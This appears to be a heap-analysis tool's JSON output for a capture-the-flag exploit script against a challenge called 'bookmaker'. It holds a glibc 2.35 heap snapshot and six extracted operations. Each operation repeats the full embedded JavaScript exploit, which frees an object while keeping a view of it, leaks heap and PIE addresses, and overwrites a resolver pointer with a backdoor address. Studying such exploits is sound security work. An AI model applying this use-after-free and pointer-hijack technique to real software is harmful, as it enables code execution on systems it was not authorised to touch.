@@ -1,0 +1,227 @@
+{
+  "schema_version": 2,
+  "path": "比赛/UMDC/bookmaker(堆)/exp.py",
+  "source_hash": "1a12f6f7b9db07b7145a8f4ae80c7d80897d4fc9dc4d52ebf983b6f7885547f9",
+  "syntax_valid": true,
+  "syntax_error": "",
+  "model_status": "PARTIAL_REPLAY",
+  "analysis_variant": "default",
+  "failure_reasons": [
+    "unknown allocation size"
+  ],
+  "semantic_verified": false,
+  "allocator": {
+    "arch": "amd64",
+    "libc": "glibc 2.35",
+    "mode": "strict"
+  },
+  "api_profile": {},
+  "operations": [
+    {
+      "op_id": "op_001",
+      "kind": "alloc",
+      "chunk": "b",
+      "index": "0",
+      "request_size": "8",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: r\"\"\"\nfunction r64(dv, off) {\n  let v = 0;\n  let m = 1;\n  for (let i = 0; i < 8; i++) {\n    v += dv.getUint8(off + i) * m;\n    m *= 256;\n  }\n  return v;\n}\n\nfunction w64(dv, off, v) {\n  for (let i = 0; i < 8; i++) {\n    dv.setUint8(off + i, v & 0xff);\n    v = Math.floor(v / 256);\n  }\n}\n\nfunction ab64(v) {\n  let b = new ArrayBuffer(8);\n  let d = new DataView(b);\n  w64(d, 0, v);\n  return b;\n}\n\nlet ledger = new Ledger(48);\nlet view = ledger.view();\nlet dv = new DataView(view);\nledger.recycle();\n\nlet id = mintWire();\n\nlet data_ptr = r64(dv, 0);\nlet resolver = r64(dv, 24);\nlet pie = resolver - 0xb390;\nlet backdoor = pie + 0xb3c0;\nlet global_resolver = data_ptr - 0x18;\n\nw64(dv, 0, global_resolver);\nw64(dv, 8, 8);\nwireWrite(id, ab64(backdoor));\nsettle(\"owned\");\n__END_MARKET_SCRIPT__\n\"\"\"",
+      "meta": {
+        "parse_confidence": "embedded-script",
+        "language": "javascript",
+        "source_line": "7",
+        "source_end_line": "50",
+        "source_id": "source_54f864824388dfd8",
+        "ast_fingerprint": "18204e57144e414f"
+      }
+    },
+    {
+      "op_id": "op_002",
+      "kind": "alloc",
+      "chunk": "d",
+      "index": "1",
+      "request_size": "b",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: r\"\"\"\nfunction r64(dv, off) {\n  let v = 0;\n  let m = 1;\n  for (let i = 0; i < 8; i++) {\n    v += dv.getUint8(off + i) * m;\n    m *= 256;\n  }\n  return v;\n}\n\nfunction w64(dv, off, v) {\n  for (let i = 0; i < 8; i++) {\n    dv.setUint8(off + i, v & 0xff);\n    v = Math.floor(v / 256);\n  }\n}\n\nfunction ab64(v) {\n  let b = new ArrayBuffer(8);\n  let d = new DataView(b);\n  w64(d, 0, v);\n  return b;\n}\n\nlet ledger = new Ledger(48);\nlet view = ledger.view();\nlet dv = new DataView(view);\nledger.recycle();\n\nlet id = mintWire();\n\nlet data_ptr = r64(dv, 0);\nlet resolver = r64(dv, 24);\nlet pie = resolver - 0xb390;\nlet backdoor = pie + 0xb3c0;\nlet global_resolver = data_ptr - 0x18;\n\nw64(dv, 0, global_resolver);\nw64(dv, 8, 8);\nwireWrite(id, ab64(backdoor));\nsettle(\"owned\");\n__END_MARKET_SCRIPT__\n\"\"\"",
+      "meta": {
+        "parse_confidence": "embedded-script",
+        "language": "javascript",
+        "source_line": "7",
+        "source_end_line": "50",
+        "source_id": "source_54f864824388dfd8",
+        "ast_fingerprint": "18204e57144e414f"
+      }
+    },
+    {
+      "op_id": "op_003",
+      "kind": "alloc",
+      "chunk": "ledger",
+      "index": "2",
+      "request_size": "48",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: r\"\"\"\nfunction r64(dv, off) {\n  let v = 0;\n  let m = 1;\n  for (let i = 0; i < 8; i++) {\n    v += dv.getUint8(off + i) * m;\n    m *= 256;\n  }\n  return v;\n}\n\nfunction w64(dv, off, v) {\n  for (let i = 0; i < 8; i++) {\n    dv.setUint8(off + i, v & 0xff);\n    v = Math.floor(v / 256);\n  }\n}\n\nfunction ab64(v) {\n  let b = new ArrayBuffer(8);\n  let d = new DataView(b);\n  w64(d, 0, v);\n  return b;\n}\n\nlet ledger = new Ledger(48);\nlet view = ledger.view();\nlet dv = new DataView(view);\nledger.recycle();\n\nlet id = mintWire();\n\nlet data_ptr = r64(dv, 0);\nlet resolver = r64(dv, 24);\nlet pie = resolver - 0xb390;\nlet backdoor = pie + 0xb3c0;\nlet global_resolver = data_ptr - 0x18;\n\nw64(dv, 0, global_resolver);\nw64(dv, 8, 8);\nwireWrite(id, ab64(backdoor));\nsettle(\"owned\");\n__END_MARKET_SCRIPT__\n\"\"\"",
+      "meta": {
+        "parse_confidence": "embedded-script",
+        "language": "javascript",
+        "source_line": "7",
+        "source_end_line": "50",
+        "source_id": "source_54f864824388dfd8",
+        "ast_fingerprint": "18204e57144e414f"
+      }
+    },
+    {
+      "op_id": "op_004",
+      "kind": "show",
+      "chunk": "ledger",
+      "index": "2",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: r\"\"\"\nfunction r64(dv, off) {\n  let v = 0;\n  let m = 1;\n  for (let i = 0; i < 8; i++) {\n    v += dv.getUint8(off + i) * m;\n    m *= 256;\n  }\n  return v;\n}\n\nfunction w64(dv, off, v) {\n  for (let i = 0; i < 8; i++) {\n    dv.setUint8(off + i, v & 0xff);\n    v = Math.floor(v / 256);\n  }\n}\n\nfunction ab64(v) {\n  let b = new ArrayBuffer(8);\n  let d = new DataView(b);\n  w64(d, 0, v);\n  return b;\n}\n\nlet ledger = new Ledger(48);\nlet view = ledger.view();\nlet dv = new DataView(view);\nledger.recycle();\n\nlet id = mintWire();\n\nlet data_ptr = r64(dv, 0);\nlet resolver = r64(dv, 24);\nlet pie = resolver - 0xb390;\nlet backdoor = pie + 0xb3c0;\nlet global_resolver = data_ptr - 0x18;\n\nw64(dv, 0, global_resolver);\nw64(dv, 8, 8);\nwireWrite(id, ab64(backdoor));\nsettle(\"owned\");\n__END_MARKET_SCRIPT__\n\"\"\"",
+      "meta": {
+        "parse_confidence": "embedded-script",
+        "language": "javascript",
+        "source_line": "7",
+        "source_end_line": "50",
+        "source_id": "source_54f864824388dfd8",
+        "ast_fingerprint": "18204e57144e414f"
+      }
+    },
+    {
+      "op_id": "op_005",
+      "kind": "alloc",
+      "chunk": "dv",
+      "index": "3",
+      "request_size": "view",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: r\"\"\"\nfunction r64(dv, off) {\n  let v = 0;\n  let m = 1;\n  for (let i = 0; i < 8; i++) {\n    v += dv.getUint8(off + i) * m;\n    m *= 256;\n  }\n  return v;\n}\n\nfunction w64(dv, off, v) {\n  for (let i = 0; i < 8; i++) {\n    dv.setUint8(off + i, v & 0xff);\n    v = Math.floor(v / 256);\n  }\n}\n\nfunction ab64(v) {\n  let b = new ArrayBuffer(8);\n  let d = new DataView(b);\n  w64(d, 0, v);\n  return b;\n}\n\nlet ledger = new Ledger(48);\nlet view = ledger.view();\nlet dv = new DataView(view);\nledger.recycle();\n\nlet id = mintWire();\n\nlet data_ptr = r64(dv, 0);\nlet resolver = r64(dv, 24);\nlet pie = resolver - 0xb390;\nlet backdoor = pie + 0xb3c0;\nlet global_resolver = data_ptr - 0x18;\n\nw64(dv, 0, global_resolver);\nw64(dv, 8, 8);\nwireWrite(id, ab64(backdoor));\nsettle(\"owned\");\n__END_MARKET_SCRIPT__\n\"\"\"",
+      "meta": {
+        "parse_confidence": "embedded-script",
+        "language": "javascript",
+        "source_line": "7",
+        "source_end_line": "50",
+        "source_id": "source_54f864824388dfd8",
+        "ast_fingerprint": "18204e57144e414f"
+      }
+    },
+    {
+      "op_id": "op_006",
+      "kind": "free",
+      "chunk": "ledger",
+      "index": "2",
+      "request_size": "",
+      "data": "",
+      "field": "",
+      "value": "",
+      "target": "",
+      "fd_storage": "",
+      "count": 1,
+      "note": "from EXP: r\"\"\"\nfunction r64(dv, off) {\n  let v = 0;\n  let m = 1;\n  for (let i = 0; i < 8; i++) {\n    v += dv.getUint8(off + i) * m;\n    m *= 256;\n  }\n  return v;\n}\n\nfunction w64(dv, off, v) {\n  for (let i = 0; i < 8; i++) {\n    dv.setUint8(off + i, v & 0xff);\n    v = Math.floor(v / 256);\n  }\n}\n\nfunction ab64(v) {\n  let b = new ArrayBuffer(8);\n  let d = new DataView(b);\n  w64(d, 0, v);\n  return b;\n}\n\nlet ledger = new Ledger(48);\nlet view = ledger.view();\nlet dv = new DataView(view);\nledger.recycle();\n\nlet id = mintWire();\n\nlet data_ptr = r64(dv, 0);\nlet resolver = r64(dv, 24);\nlet pie = resolver - 0xb390;\nlet backdoor = pie + 0xb3c0;\nlet global_resolver = data_ptr - 0x18;\n\nw64(dv, 0, global_resolver);\nw64(dv, 8, 8);\nwireWrite(id, ab64(backdoor));\nsettle(\"owned\");\n__END_MARKET_SCRIPT__\n\"\"\"",
+      "meta": {
+        "parse_confidence": "embedded-script",
+        "language": "javascript",
+        "source_line": "7",
+        "source_end_line": "50",
+        "source_id": "source_54f864824388dfd8",
+        "ast_fingerprint": "18204e57144e414f"
+      }
+    }
+  ],
+  "diagnostics": [
+    {
+      "severity": "info",
+      "code": "embedded_heap_script",
+      "message": "已从嵌入 JavaScript 静态提取 6 个对象生命周期步骤。",
+      "start": 0,
+      "end": 0,
+      "line": 0,
+      "suggestion": ""
+    }
+  ],
+  "branch_groups": [],
+  "final_snapshot": {
+    "step": 6,
+    "aborted": false,
+    "chunks": {
+      "b": {
+        "address": "heap_base+0x290",
+        "user_address": "heap_base+0x2a0",
+        "request_size": "8",
+        "chunk_size": "0x20",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "derived"
+      },
+      "d": {
+        "address": "heap_base+?<d:chunk>",
+        "user_address": "heap_base+?<d:user>",
+        "request_size": "b",
+        "chunk_size": "未知",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "unknown"
+      },
+      "ledger": {
+        "address": "heap_base+?<ledger:chunk>",
+        "user_address": "heap_base+?<ledger:user>",
+        "request_size": "48",
+        "chunk_size": "0x40",
+        "lifecycle": "freed",
+        "bin_location": "tcache[0x40]",
+        "fd": "PROTECT_PTR(heap_base+?<ledger:chunk>+0x10, NULL)",
+        "bk": "",
+        "provenance": "unknown"
+      },
+      "dv": {
+        "address": "heap_base+?<dv:chunk>",
+        "user_address": "heap_base+?<dv:user>",
+        "request_size": "view",
+        "chunk_size": "未知",
+        "lifecycle": "allocated",
+        "bin_location": "",
+        "fd": "",
+        "bk": "",
+        "provenance": "unknown"
+      }
+    },
+    "bins": {
+      "tcache": {
+        "0x40": [
+          "ledger"
+        ]
+      },
+      "fastbins": {},
+      "smallbins": {},
+      "largebins": {},
+      "unsorted": []
+    },
+    "warnings": []
+  }
+}
